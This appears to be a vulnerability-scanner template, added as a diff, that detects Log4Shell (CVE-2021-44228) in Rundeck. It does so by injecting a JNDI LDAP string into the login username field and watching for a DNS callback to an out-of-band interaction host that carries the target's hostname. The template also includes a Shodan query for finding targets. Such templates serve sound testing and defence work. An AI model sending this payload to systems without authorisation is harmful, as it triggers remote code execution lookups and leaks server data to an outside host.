@@ -1,0 +1,69 @@
+http:
+    - extractors:
+        - kval:
+            - interactsh_ip
+          type: kval
+        - group: 2
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+        - group: 1
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+        - part: location
+          type: word
+          words:
+            - '{{BaseURL}}/user/error'
+        - part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          POST /j_security_check HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+          Origin: {{BaseURL}}
+          Connection: close
+          Referer: {{BaseURL}}/user/login
+
+          j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=admin
+id: rundeck-log4j
+info:
+    author: DhiyaneshDK
+    classification:
+        cve-id: CVE-2021-44228
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: Rundeck is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+    metadata:
+        max-request: 1
+        shodan-query: title:"Rundeck"
+        verified: true
+    name: Rundeck - Remote Code Execution (Apache Log4j)
+    reference:
+        - https://docs.rundeck.com/docs/history/CVEs/log4j.html
+        - https://logging.apache.org/log4j/2.x/security.html
+        - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    severity: critical
+    tags:
+        - jndi
+        - log4j
+        - rundeck
+        - kev
+        - oast
+        - Logging
+        - Rundeck
+variables:
+    rand1: '{{rand_int(111, 999)}}'
+    rand2: '{{rand_int(111, 999)}}'
